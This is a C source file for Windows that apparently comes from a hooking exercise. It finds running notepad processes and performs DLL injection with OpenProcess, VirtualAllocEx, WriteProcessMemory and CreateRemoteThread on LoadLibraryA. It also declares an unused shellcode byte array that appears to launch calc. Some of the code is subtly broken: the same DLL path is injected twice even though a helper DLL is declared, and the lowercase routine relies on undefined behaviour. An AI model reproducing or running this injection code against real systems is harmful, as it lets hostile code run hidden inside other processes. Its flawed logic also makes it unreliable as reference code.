
#include "stdafx.h"
#include "stdio.h"
#include "windows.h"
#include <tlhelp32.h>
#include <tchar.h>
#include <string.h>

#pragma comment(lib, "Injected.lib")

//  Forward declarations:
void GetProcessList(void);
void toLower(TCHAR *ptrStr);


int _tmain(int argc, _TCHAR* argv[])
{
	
	GetProcessList();

	return 0;
}

void GetProcessList()
{
	//HANDLE: https://msdn.microsoft.com/en-us/library/windows/desktop/ms724457%28v=vs.85%29.aspx
	HANDLE hProcessSnap;
	HANDLE hProcess;
	HANDLE hTargetProcess;
	PROCESSENTRY32 pe32; //https://msdn.microsoft.com/en-us/library/windows/desktop/ms724457%28v=vs.85%29.aspx
	DWORD dwPriorityClass;
	char*injectDLL = "C:\\Users\\User\\Desktop\\Hooking_2\\Injector\\Debug\\Injected.dll";
	char*helperDLL = "C:\\Users\\User\\Desktop\\Hooking_2\\Injector\\Debug\\Helper.dll";

	// Shellcode
	char shellcode[] = { '\xcc', '\x33', '\xc0', '\x50', '\x68', '\x2E', '\x65', '\x78', '\x65', '\x68', '\x63', '\x61', '\x6C',
		'\x63', '\x8B', '\xC4', '\x6A', '\x01', '\x50', '\xBB', '\xFD', '\xe5', '\x3e', '\x77', '\xFF', '\xD3',
		'\x31','\xc0','\x50','\xe8','\x11','\xf6','\x94','\x77'};

	// Take a snapshot of all processes in the system.
	//https://msdn.microsoft.com/en-us/library/windows/desktop/ms682489%28v=vs.85%29.aspx
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE) // -1
	{
		puts("[!] ERROR");
		return;
	}

	//The size of the structure, in bytes. 
	//Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32). 
	//If you do not initialize dwSize, Process32First fails.
	pe32.dwSize = sizeof(PROCESSENTRY32);

	// Retrieve information about the first process,
	// and exit if unsuccessful
	if (!Process32First(hProcessSnap, &pe32))
	{
		puts("[!] ERROR");
		CloseHandle(hProcessSnap);
		return;
	}

	//Enumerate processes
	do
	{
		toLower(pe32.szExeFile);

		if (strstr(pe32.szExeFile, "notepad")) {
			
			printf("[*] Process: %s - %d\n", pe32.szExeFile, pe32.th32ProcessID);

			//Get Handle to chosen process
			hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);

			if (hTargetProcess == NULL) {
				puts("[!] ERROR getting process handle");
				return;
			}

			//Get address for LoadLibrary - use to load our DLL
			LPVOID hLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

			if (hLoadLibrary == NULL) {
				puts("[!] ERROR getting handle to LoadLibrary");
				return;
			}

			//allocate memory in target process address space
			LPVOID newMemoryBase = (LPVOID)VirtualAllocEx(hTargetProcess, NULL, strlen(injectDLL), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
			//LPVOID nMemoryBase = (LPVOID)VirtualAllocEx(hTargetProcess, NULL, strlen(injectDLL), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

			if (newMemoryBase == NULL ){
				puts("[!] ERROR allocating new memory");
				return;
			}
			puts("[*] Memory Allocated");
		
			//******** Inject Helper DLL
			//Write to memory
			int writeResult = WriteProcessMemory(hTargetProcess, newMemoryBase, injectDLL, strlen(injectDLL), NULL);

			if (writeResult == 0) {
				puts("[!] ERROR Failed to write in new memory");
				return;
			}
			puts("[*] Argument written");

			//Execute our shellcode
			HANDLE threadID = CreateRemoteThread(hTargetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)hLoadLibrary, newMemoryBase, NULL, NULL);
			if (threadID == NULL){
				puts("[!] ERROR starting new thread");
				return;
			}
			printf("[WOOT] Helper DLL Injected ThreadID - %d\n", threadID);

			//********* Write Hook DLL
			//Write DLL to new memory
			writeResult = WriteProcessMemory(hTargetProcess, newMemoryBase, injectDLL, strlen(injectDLL), NULL);

			if (writeResult == 0) {
				puts("[!] ERROR Failed to write in new memory");
				return;
			}
			puts("[*] Argument written");

			//Use LoadLibrary to load our DLL
			threadID = CreateRemoteThread(hTargetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)hLoadLibrary, newMemoryBase, NULL, NULL);
			if (threadID == NULL){
				puts("[!] ERROR starting new thread");
				return;
			}
			printf("[WOOT] Injected DLL Injected ThreadID - %d\n", threadID);
			

			CloseHandle(hTargetProcess);
		}

	} while (Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);

	return;
}

void toLower(TCHAR *pStr)
{
	while (*pStr++ = _totlower(*pStr));
}

